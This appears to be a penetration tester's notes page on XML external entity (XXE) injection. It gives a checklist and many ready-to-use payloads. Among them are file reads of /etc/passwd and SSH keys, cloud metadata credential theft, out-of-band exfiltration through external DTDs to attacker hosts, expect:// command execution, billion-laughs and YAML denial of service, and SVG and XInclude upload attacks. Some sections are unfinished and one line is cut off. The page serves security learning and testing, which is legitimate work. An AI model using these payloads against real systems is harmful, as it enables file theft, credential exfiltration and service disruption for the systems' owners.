# XXE

## XXE (XML external entity) injection

### What is it?

XML External Entity (XXE) vulnerabilities occur when an application processes XML input that includes a reference to an external entity. This vulnerability can occur in any technology that parses XML. By exploiting an XXE vulnerability, an attacker can read local files on the server, interact with internal systems, or conduct denial of service attacks.

**A simple example**

A vulnerable application might parse XML input from a user without disabling external entities. An attacker could then send XML like the following:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

In this case, the XML parser will replace `&xxe;` with the contents of the `/etc/passwd` file and include it in the output.

XXE can often lead to:

* Disclosure of internal files
* Server Side Request Forgery (SSRF)
* Denial of Service
* Remote Code Execution in some rare cases

**Other learning resources:**

* PortSwigger: [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
* OWASP: [https://owasp.org/www-community/vulnerabilities/XML\_External\_Entity\_(XXE)\_Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_\(XXE\)_Processing)

**Writeups:**

*

### Checklist

**Objective**

* [ ] Identify endpoints that can process XML
* [ ] Create a working XML payload that can be adapted to deliver exploits
* [ ] Test identified endpoints for XXE

**Attack surface discovery**

* [ ] Identify endpoints that accept XML payloads
  * [ ] Review requests in proxy for XML data
  * [ ] Identify endpoints that accept JSON by sending XML
  * [ ] Identify endpoints that accept images by sending SVG images
  * [ ] Identify endpoints that accept documents by sending DOCX or PDF files
* [ ] Test with the header `Content-Type: application/xml`
* [ ] Verify working XML payloads that can be adapted to deliver exploits
* [ ] Locate internal DTDs

**Testing**

* [ ] Test for external entities with a simple non-malicious payload
* [ ] Test for external entities with an available file (e.g. for Linux /etc/passwd)
* [ ] Test for external entities with an available endpoint you control (e.g. collaborator or webhook.site)
* [ ] Test for external entities with other available endpoints
  * [ ] EC2 metadata endpoint `http://169.254.169.254/latest/meta-data`
* [ ] Test filters and restrictions
  * [ ] Trigger error messages to exfiltrate information
* [ ] Test for denial of service
* [ ] Test for code execution

**Impact**

* [ ] Can we read sensitive files?
  * [ ] Configuration files
  * [ ] System files
  * [ ] SQLite files
  * [ ] SSH keys
* [ ] Can we exfiltrate sensitive information?
* [ ] Can we achieve code execution?

### Exploitation

**Sources**

* My pentest notes
* PortSwigger
* PayloadsAllTheThings

Detect XXE

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe "test"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

Include files\
\&#xNAN;_Note:_ You might need `"file:///etc/passwd"`

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

List files: _Note:_ Restricted to Java applications

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE aa[<!ELEMENT bb ANY>
<!ENTITY xxe SYSTEM "file:///">]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

Out-of-band:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://collaborator"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

Parameter entities:

```xml
<!DOCTYPE ase [ <!ENTITY % xxe SYSTEM "http://collaborator"> %xxe; ]>
```

Load an external DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://our-site.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Execute code _Note:_ Only works in the PHP 'expect' module is available

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>
    <bar>&xxe;</bar>
</foo>
```

**Include XML as a parameter value**

```xml
param=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Other sources**

* Fuzzing for XXE [https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
* Fuzzing for local DTDs [https://github.com/GoSecure/dtd-finder/tree/master/list](https://github.com/GoSecure/dtd-finder/tree/master/list)

### Summary

{% hint style="info" %}
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.
{% endhint %}

Detection:

```shellscript
# Content type "application/json" or "application/x-www-form-urlencoded" to "applcation/xml".
# File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files.
# If svg allowed in picture upload, you can inject xml in svgs.
# If the web app offers RSS feeds, add your milicious code into the RSS.
# Fuzz for /soap api, some applications still running soap apis
# If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse
```

Check:

```xml
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY test "THIS IS A STRING!">]>
<methodCall><methodName>&test;</methodName></methodCall>
```

If works, then:

```xml
<?xml version="1.0"?>
<!DOCTYPE a[<!ENTITY test SYSTEM "file:///etc/passwd">]>
<methodCall><methodName>&test;</methodName></methodCall>
```

## Blind XXE

### What is it?

Blind XML External Entity (XXE) vulnerabilities arise when an application processes XML input that includes references to an external entity, but does not return the outcome of the entity processing in the response. This makes the exploitation less direct since the attacker does not receive an immediate output from the injected payload. Blind XXE can be exploited to exfiltrate data, scan internal systems, or execute remote requests within the network that hosts the vulnerable application.

### Exploitation

Blind XXE using OOB

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://collaborator"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

Blind XXE using OOB with XML parameter entities

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator"> %xxe; ]>
```

<details>

<summary>Solution</summary>

```
1. Check the stock of an item and send the POST request with XML to repeater

2. 
```

</details>

### Tools

```shellscript
# https://github.com/BuffaloWill/oxml_xxe
# https://github.com/enjoiz/XXEinjector
```

### Attacks

```shellscript
# Get PHP file:
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<methodCall><methodName>&test;</methodName></methodCall>

# Classic XXE Base64 encoded
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

# Check if entities are enabled
<!DOCTYPE replace [<!ENTITY test "pentest"> ]>
 <root>
  <xxe>&test;</xxe>
 </root>

# XXE LFI:
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

# XXE Blind LFI:
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>

# XXE Access control bypass
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>

# XXE to SSRF:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

# XXE OOB
<?xml version="1.0"?>
<!DOCTYPE data [ 
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://your.host/remote.dtd"> 
%dtd;]>
<data>&send;</data>

# PHP Wrapper inside XXE
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>

# Deny Of Service - Billion Laugh Attack

<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>

# Yaml attack

a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]

# XXE OOB Attack (Yunusov, 2013)

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;

# XXE OOB with DTD and PHP filter

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://92.222.81.2/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://92.222.81.2/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>">

# XXE Inside SOAP

<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>

# XXE PoC

<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>

# XXE file upload SVG
<svg>&xxe;</svg>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>

<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  

# XXE Hidden Attack

- Xinclude

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Set the value of the productId parameter to:
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

- File uploads:

Create a local SVG image with the following content:
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
Post a comment on a blog post, and upload this image as an avatar.
When you view your comment, you should see the contents of the /etc/hostname file in your image. Then use the "Submit solution" but
```

### Mindmap

![](https://1729840239-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-McWX01BY7lemk0xfTEc%2F-McWXDjvI6LU4i-al3VS%2Fimage.png?alt=media\&token=34456c73-7258-41fb-af3f-5c3c75a9de00)
